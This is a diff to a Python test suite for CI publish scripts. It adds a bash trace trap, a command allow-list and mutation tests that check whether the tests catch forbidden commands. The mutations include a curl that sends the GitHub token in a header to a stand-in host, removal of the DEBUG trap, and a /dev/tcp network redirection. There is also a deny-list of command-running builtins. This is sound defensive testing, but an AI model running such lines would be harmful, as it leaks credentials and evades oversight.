@@ -8,13 +8,28 @@ in a temporary directory laid out as `actions/download-artifact` leaves the buil
 `release` artefact, with each `${{ }}` of the step's `env` given a value. The `PATH`
 holds stand-ins for `gh`, `skopeo` and `sleep` (`release_stubs.py`, which says what
 of the real programs they copy) and the four text tools the scripts use, and nothing
-else, so a step reaches no registry, no GitHub and no network. Each test then reads
-what the step wrote and what it left: the registry's tags, the releases and their
-wheels, and every call made.
+else. Each test then reads what the step wrote and what it left: the registry's tags,
+the releases and their wheels, and every call made.
+
+A `PATH` is not a sandbox: a command named by a path, and bash's `/dev/tcp`, pass it.
+So every command the step runs is also recorded as bash is about to run it, by a
+DEBUG trap (`TRACE`, through `BASH_ENV`), into a file the step cannot redirect, and
+`Publish.run` refuses any command whose word is not one of `SHELL_WORDS`, the stubs,
+the tools or a function the script defines (`Publish.unapproved`), whatever the step
+does with the command's stderr or its exit status. The trap stops, before it runs, a
+command named by a path, one of the builtins that run another command, and one that
+names `/dev/tcp` or `/dev/udp`. With `test_every_line_of_each_publish_script_runs_in_some_test`,
+a command added on any line of either script is checked. What this does not see: a
+command word or a redirection built at run time from variables is judged by its text,
+not its value (`$cmd args` is refused as unknown; `> "$file"` is not looked at), and a
+command on a line some test runs, in a part of that line no test reaches
+(`a || b` where `a` always succeeds in the tests), is not run.
 """
 
+import copy
 import hashlib
 import io
+import itertools
 import json
 import os
 import re
@@ -37,6 +52,44 @@ TOKEN = "ghs_" + "t" * 36
 SHA = "a" * 40
 # the programs other than the stubs that the publish scripts run
 TOOLS = ("cut", "grep", "head", "sha256sum")
+# The commands a step may run: these shell builtins and keywords, the stubs, the tools,
+# and the functions the script itself defines.
+SHELL_WORDS = {"echo", "printf", "test", "[", "[[", "((", "exit", "break", "continue", "true", "false", ":",
+               "for", "case", "while", "until"}
+STUB_NAMES = ("gh", "skopeo", "sleep")
+# Sourced by bash before the script (`BASH_ENV`). It records each command as bash is
+# about to run it, NUL-separated, with whether it ran. `Publish.unapproved` is the
+# check: it reads each recorded command's word as bash does. Before that, the trap is a
+# net that keeps a changed script from reaching anything in the tests' own runs: it
+# skips a command whose first word names a path or runs another command (`exec`,
+# `command`, `eval`, `source`, `.`, `builtin`, `coproc`, `time`), and one that names
+# `/dev/tcp` or `/dev/udp`; under `set -e` the step then stops. The net splits words at
+# spaces (`x="a b" /bin/c` gets past it), so it is not what fails a test. The trap
+# function and the two names are read-only, and `trap - DEBUG`, `set +T` and the like
+# are themselves recorded, and refused, before they run.
+TRACE = r"""readonly PATH STEP_TRACE
+shopt -s extdebug
+set -o functrace
+__step_trace() {
+    local line=$1 word first= run=run
+    local -a words
+    read -r -a words <<< "$BASH_COMMAND"
+    for word in "${words[@]}"; do
+        case $word in */dev/tcp/* | */dev/udp/*) run=skip ;; esac
+        if [ -z "$first" ]; then
+            case $word in
+                [A-Za-z_]*=*) case ${word%%=*} in *[!A-Za-z0-9_]*) first=$word ;; esac ;;
+                *) first=$word ;;
+            esac
+        fi
+    done
+    case $first in /* | exec | command | eval | source | . | builtin | coproc | time) run=skip ;; esac
+    printf '%s\t%s\t%s\0' "$run" "$line" "$BASH_COMMAND" >> "$STEP_TRACE"
+    [ "$run" = run ]
+}
+readonly -f __step_trace
+trap '__step_trace "$LINENO"' DEBUG
+"""
 # what the runner sets that the scripts read
 RUNNER = {"GITHUB_ACTOR": "github-actions[bot]", "GITHUB_REPOSITORY": REPO, "GITHUB_SHA": SHA}
 
@@ -69,11 +122,11 @@ class Publish:
     the test sets up. `run()` runs it once; `github`, `registry` and `calls` are then
     what it left."""
 
-    def __init__(self, tmp_path: Path, workflow: dict, job: str, version: str = VERSION):
+    def __init__(self, tmp_path: Path, workflow: dict, job: str, version: str = VERSION, script: str | None = None):
         self.job = workflow["jobs"][job]
         (step,) = [s for s in self.job["steps"] if "run" in s]
         assert workflow["defaults"]["run"]["shell"] == "bash"
-        self.script, self.step_env = step["run"], step.get("env", {})
+        self.script, self.step_env = step["run"] if script is None else script, step.get("env", {})
         self.workflow_env = workflow["env"]
         self.version = version
         self.tag = f"v{version}"
@@ -116,7 +169,7 @@ class Publish:
         }
 
         # what GitHub and the registry hold before the step runs
-        self.github = {"tags": [self.tag], "releases": [], "fail": {}}
+        self.github = {"tags": [self.tag], "releases": [], "fail": {}, "lookup_wins": [], "lookups_raced": 0}
         self.registry = {
             "tags": {},
             "repository_exists": True,
@@ -126,8 +179,10 @@ class Publish:
             "logouts": 0,
         }
         self.calls: list[dict] = []
+        # (ran, line, command) for every command the step was about to run
+        self.trace: list[tuple[bool, int, str]] = []
 
-        for program in ("gh", "skopeo", "sleep"):
+        for program in STUB_NAMES:
             stub = self.bin / program
             stub.write_text(
                 f"#!{sys.executable} -IS\n"
@@ -143,6 +198,7 @@ class Publish:
     def release(self, *, draft: bool, wheel: bytes | None = None, tag: str | None = None) -> dict:
         """A release the step finds; `wheel`, if given, is attached under its name."""
         release = {
+            "id": len(self.github["releases"]) + 1,
             "tag": tag or self.tag,
             "draft": draft,
             "prerelease": False,
@@ -163,12 +219,16 @@ class Publish:
         assert used <= RUNNER.keys(), used - RUNNER.keys()
         return {
             "PATH": str(self.bin),
+            "BASH_ENV": str(self.state / "trace.sh"),
+            "STEP_TRACE": str(self.state / "trace"),
             **self.workflow_env,
             **RUNNER,
             **{name: value(expression) for name, expression in self.step_env.items()},
         }
 
-    def run(self) -> subprocess.CompletedProcess:
+    def execute(self) -> subprocess.CompletedProcess:
+        """Runs the step once, and reads what it left; `run` also checks what it ran."""
+        (self.state / "trace.sh").write_text(TRACE)
         (self.state / "github.json").write_text(json.dumps(self.github))
         (self.state / "registry.json").write_text(json.dumps(self.registry))
         script = self.state / "step.sh"
@@ -181,14 +241,34 @@ class Publish:
             text=True,
             timeout=60,
         )
-        assert "command not found" not in result.stderr, result.stderr
-        # a call the stubs do not know, even one whose stderr the step discarded
-        refused = self.state / "refused.jsonl"
-        assert not refused.exists(), refused.read_text()
         self.github = json.loads((self.state / "github.json").read_text())
         self.registry = json.loads((self.state / "registry.json").read_text())
         log = self.state / "calls.jsonl"
         self.calls = [json.loads(line) for line in log.read_text().splitlines()] if log.exists() else []
+        trace = self.state / "trace"
+        records = trace.read_text().split("\0")[:-1] if trace.exists() else []
+        self.trace = [(ran == "run", int(line), command) for ran, line, command in (r.split("\t", 2) for r in records)]
+        return result
+
+    def unapproved(self) -> list[str]:
+        """Each command the step ran, or was stopped from running, that it may not run."""
+        allowed = SHELL_WORDS | set(STUB_NAMES) | set(TOOLS) | _functions(self.script)
+        return [
+            command for ran, _, command in self.trace
+            if not ran or (_command_word(command) or ":") not in allowed
+        ]
+
+    def refused(self) -> list[dict]:
+        """Each call a stub refused, even one whose stderr the step discarded."""
+        log = self.state / "refused.jsonl"
+        return [json.loads(line) for line in log.read_text().splitlines()] if log.exists() else []
+
+    def run(self) -> subprocess.CompletedProcess:
+        result = self.execute()
+        assert self.trace, "the trap recorded nothing"
+        assert self.unapproved() == [], self.unapproved()
+        assert self.refused() == [], self.refused()
+        assert "command not found" not in result.stderr, result.stderr
         return result
 
     def argvs(self, program: str, verb: str | None = None) -> list[list[str]]:
@@ -196,6 +276,93 @@ class Publish:
             c["argv"] for c in self.calls
             if c["program"] == program and (verb is None or c["argv"][:1] == [verb] or c["argv"][1:2] == [verb])
         ]
+
+
+_ASSIGNMENT = re.compile(r"[A-Za-z_][A-Za-z0-9_]*(\[[^]]*\])?\+?=")
+_REDIRECTION = re.compile(r"\d*(<<<|<<|>>|<>|>\||>&|<&|&>>|&>|>|<)")
+
+
+def _words(command: str) -> list[str]:
+    """`command` split into words as bash would before expansion: quotes, `$( )`,
+    `${ }`, backquotes and `( )` keep their spaces."""
+    words, word, nest, i = [], "", [], 0
+    while i < len(command):
+        c = command[i]
+        top = nest[-1] if nest else None
+        if top == "'":
+            if c == "'":
+                nest.pop()
+        elif c == "\\":
+            word += command[i : i + 2]
+            i += 2
+            continue
+        elif top == '"':
+            if c == '"':
+                nest.pop()
+            elif command.startswith("$(", i) or command.startswith("${", i):
+                nest.append(command[i + 1])
+                word += command[i : i + 2]
+                i += 2
+                continue
+            elif c == "`":
+                nest.append("`")
+        elif top == "`":
+            if c == "`":
+                nest.pop()
+        elif c in "\"'`(":
+            nest.append(c)
+        elif command.startswith("${", i):
+            nest.append("{")
+            word += "${"
+            i += 2
+            continue
+        elif (c == ")" and top == "(") or (c == "}" and top == "{"):
+            nest.pop()
+        elif c.isspace() and top is None:
+            if word:
+                words.append(word)
+            word = ""
+            i += 1
+            continue
+        word += c
+        i += 1
+    return words + [word] if word else words
+
+
+def _command_word(command: str) -> str | None:
+    """The word bash runs `command` as, past its assignments and redirections; None for
+    a command that only assigns."""
+    words = iter(_words(command))
+    for word in words:
+        if _ASSIGNMENT.match(word):
+            continue
+        if _REDIRECTION.fullmatch(word):
+            next(words, None)
+            continue
+        if _REDIRECTION.match(word):
+            continue
+        return word
+    return None
+
+
+def _functions(script: str) -> set[str]:
+    return set(re.findall(r"^\s*([A-Za-z_]\w*)\s*\(\)", script, re.M))
+
+
+def test_reading_a_command_word():
+    assert _command_word('have=$(digest_of manifest.json)') is None
+    assert _command_word('draft=$(gh release view "$tag" --repo "$GITHUB_REPOSITORY" 2> /dev/null)') is None
+    assert _command_word('flags=(--prerelease)') is None
+    assert _command_word('ref="docker://$IMAGE:$VERSION"') is None
+    assert _command_word('x="a b" y=$(c d) skopeo copy a b') == "skopeo"
+    assert _command_word('2> err grep -qiE \'manifest unknown|name unknown\' inspect.err') == "grep"
+    assert _command_word('>out echo "$(curl x)"') == "echo"
+    assert _command_word('"$cmd" args') == '"$cmd"'
+    assert _command_word('/usr/bin/curl x') == "/usr/bin/curl"
+    assert _command_word('echo "a \\" b" c') == "echo"
+    assert _words('echo "x $(printf "%s" "a b") y" `z w` ${v:-a b}') == [
+        "echo", '"x $(printf "%s" "a b") y"', "`z w`", "${v:-a b}"
+    ]
 
 
 def test_the_artefact_is_laid_out_where_the_publish_scripts_read_it(workflow):
@@ -461,3 +628,137 @@ def test_the_steps_run_nothing_but_the_stubs_and_the_text_tools(tmp_path, workfl
         assert publish.run().returncode == 0
         assert {c["program"] for c in publish.calls} <= {"gh", "skopeo", "sleep"}
         assert sorted(os.listdir(publish.bin)) == sorted(("gh", "skopeo", "sleep", *TOOLS))
+
+
+# --- What a step may run ---
+
+
+def _scenarios(tmp_path, workflow, job):
+    """Runs of `job` that between them take every branch of its script."""
+    other = b"a wheel some other build made"
+    if job == "publish-image":
+        def setups():
+            yield "absent", lambda p: None
+            yield "same", lambda p: p.registry["tags"].update({VERSION: p.index.hex()})
+            yield "other", lambda p: p.registry["tags"].update({VERSION: _image_index(note="x").hex()})
+            yield "error", lambda p: p.registry["inspect_errors"].extend(REGISTRY_ERRORS[:3])
+    else:
+        def setups():
+            yield "new", lambda p: p.outputs.update(prerelease="true")
+            yield "draft-same", lambda p: p.release(draft=True, wheel=p.wheel)
+            yield "draft-missing", lambda p: p.release(draft=True)
+            yield "draft-other", lambda p: p.release(draft=True, wheel=other)
+            yield "published-same", lambda p: p.release(draft=False, wheel=p.wheel)
+    for name, setup in setups():
+        publish = Publish(tmp_path / name, workflow, job)
+        setup(publish)
+        publish.run()
+        yield publish
+
+
+_STRUCTURE = re.compile(r"fi|done|esac|else|then|do|;;|\{|\}.*|[^\s()]+\)")
+
+
+def _command_lines(script: str) -> set[int]:
+    """The lines of `script` that hold a command: not blank, a comment, a keyword or
+    brace that closes or opens a block, a `case` pattern, or the arguments of a
+    command continued from the line before (a continued line that starts with `|`,
+    `||` or `&&` holds a command)."""
+    lines, continued = set(), False
+    for number, line in enumerate(script.splitlines(), 1):
+        text = line.strip()
+        after_continuation, continued = continued, text.endswith("\\")
+        if not text or text.startswith("#") or _STRUCTURE.fullmatch(text):
+            continue
+        if after_continuation and not text.startswith(("|", "&")):
+            continue
+        lines.add(number)
+    return lines
+
+
+def test_reading_which_lines_hold_a_command():
+    script = 'if false; then\n  curl x \\\n    --flag\n  # a note\nfi\ncase $a in\n  b)\n    echo "$a" \\\n      || exit 1\n    ;;\nesac\n'
+    assert _command_lines(script) == {1, 2, 6, 8, 9}
+
+
+@pytest.mark.parametrize("job", ["publish-image", "publish-release"])
+def test_every_line_of_each_publish_script_runs_in_some_test(tmp_path, workflow, job):
+    """So a command added anywhere in either script is run, and checked, by a test:
+    a line no test reaches fails here until one does."""
+    runs = list(_scenarios(tmp_path, workflow, job))
+    ran = {line for publish in runs for _, line, _ in publish.trace}
+    script = runs[0].script
+    missing = sorted(_command_lines(script) - ran)
+    assert missing == [], [script.splitlines()[n - 1].strip() for n in missing]
+
+
+@pytest.mark.parametrize("job", ["publish-image", "publish-release"])
+def test_no_publish_script_names_a_network_redirection(workflow, job):
+    """Bash opens `/dev/tcp/<host>/<port>` and `/dev/udp/…` as sockets, with no program
+    to see on the `PATH`; a spelling built at run time is not seen by this."""
+    (step,) = [s for s in workflow["jobs"][job]["steps"] if "run" in s]
+    assert not re.search(r"/dev/(tcp|udp)\b", step["run"])
+
+
+# Changes a step could gain that its stderr and exit status would hide: each runs, or is
+# stopped, in the step's first line, its stderr discarded and its failure handled. The
+# first two are the review's of PR #154 (an unknown program, and one handed the token).
+MUTATIONS = {
+    "unknown-program": "curl https://example.invalid/ 2>/dev/null || true",
+    "token-in-an-argument": 'curl -fsS -H "Authorization: Bearer ${TOKEN:-$GH_TOKEN}" https://example.invalid/ 2>/dev/null || true',
+    "a-path": "/usr/bin/true 2>/dev/null || true",
+    "command-builtin": "command -v curl >/dev/null 2>&1 || true",
+    "eval": "eval true 2>/dev/null || true",
+    "trap-removed": "trap - DEBUG 2>/dev/null || true",
+    "network-redirection": "echo probe 2>/dev/null > ./dev/tcp/example.invalid/80 || true",
+}
+
+
+@pytest.mark.parametrize("mutation", MUTATIONS.values(), ids=MUTATIONS.keys())
+@pytest.mark.parametrize("job", ["publish-image", "publish-release"])
+def test_a_command_the_step_may_not_run_is_caught_whatever_it_does_with_its_failure(tmp_path, workflow, job, mutation):
+    (step,) = [s for s in workflow["jobs"][job]["steps"] if "run" in s]
+    publish = Publish(tmp_path, workflow, job, script=mutation + "\n" + step["run"])
+    result = publish.execute()
+    ran, line, command = publish.trace[0]
+    assert line == 1 and publish.unapproved()[:1] == [command]
+    # a path, `/dev/tcp` and the builtins that run another command are stopped first
+    assert ran is (_command_word(command) in ("curl", "trap"))
+    if mutation == MUTATIONS["unknown-program"]:
+        # what the step's own answer shows: nothing, so only the record catches it
+        assert result.returncode == 0
+        assert "command not found" not in result.stderr
+        assert publish.refused() == []
+
+
+# --- A published release and a draft under one tag ---
+
+
+@pytest.mark.parametrize("leftover", ["none", "same", "other"])
+def test_a_rerun_over_a_published_release_and_a_leftover_draft(tmp_path, workflow, leftover):
+    """A failed lookup can leave a draft beside the published release (above). gh's
+    lookup then answers with either, call by call: every order of winners is run, and
+    in each the published release keeps its wheel and stays published, and no wheel
+    is replaced anywhere."""
+    wheels = {"none": None, "same": "this", "other": b"a wheel some other build made"}
+    explored: list[tuple[str, ...]] = []
+    for order in itertools.product(("published", "draft"), repeat=4):
+        if any(order[: len(done)] == done for done in explored):
+            continue
+        publish = Publish(tmp_path / "-".join(order), workflow, "publish-release")
+        wheel = publish.wheel if wheels[leftover] == "this" else wheels[leftover]
+        published = publish.release(draft=False, wheel=publish.wheel)
+        publish.release(draft=True, wheel=wheel)
+        before = copy.deepcopy(publish.github["releases"])
+        publish.github["lookup_wins"] = list(order)
+        publish.run()
+        explored.append(order[: publish.github["lookups_raced"]])
+        after = {r["id"]: r for r in publish.github["releases"]}
+        assert after[published["id"]]["draft"] is False
+        assert after[published["id"]]["assets"] == published["assets"]
+        for release in before:
+            for name, data in release["assets"].items():
+                assert after[release["id"]]["assets"][name] == data
+        assert len(after) == 2
+    # the draft won at least one lookup, and the published release at least one
+    assert any("draft" in done for done in explored) and any("published" in done for done in explored)
